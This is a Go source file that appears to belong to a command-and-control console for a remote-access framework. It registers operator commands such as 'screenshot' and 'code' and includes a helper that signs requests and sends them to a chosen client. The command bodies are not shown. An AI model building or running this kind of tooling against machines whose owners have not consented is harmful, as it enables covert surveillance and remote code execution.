package snippets

import (
	"fmt"
	"net/http"
	"time"

	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/internal/proto"
)

var Snippets map[string]func(ctx lib.CommandContext, arg string) (string, error)

func init() {
	Snippets = map[string]func(ctx lib.CommandContext, arg string) (string, error){
		"info":       snippetInfo,
		"screenshot": snippetScreenshot,
		"sendall":    snippetSendall,
		"sendallx":   snippetSendallx,
		"sendto":     snippetSendto,
		"code":       snippetCode,
	}
}

func sendReqAwaitResponse(ctx lib.CommandContext, clientId string, payload []byte, timeout time.Duration) (*proto.PacketRR, error) {
	clients, err := ctx.State.ClientsGet([]string{clientId})
	if err != nil || len(clients) != 1 {
		if err == nil {
			err = fmt.Errorf("%d clients matched given ID", len(clients))
		}
		return nil, fmt.Errorf("could not get client `%s` from the database: %s", clientId, err.Error())
	}

	// Write request to the DB and get a TxId.
	req, err := ctx.State.Request(clients[0].Address, proto.PacketRR{
		Payload: payload,
	})
	if err != nil {
		return nil, fmt.Errorf("could not save request to the db: %s", err.Error())
	}

	data, err := proto.Marshal(&req, ctx.OwnPrivKey)
	if err != nil {
		return nil, fmt.Errorf("could not marshal packet data: %s", err.Error())
	}

	err = (*ctx.Radio).Send(ctx.Context, proto.Packet{
		Peer:   clients[0].Address,
		Method: http.MethodPost,
		Route:  proto.ROUTE_RR,
		Data:   data,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to send packet: %s", err.Error())
	}

	return ctx.State.AwaitResponse(req.TxId, timeout)
}
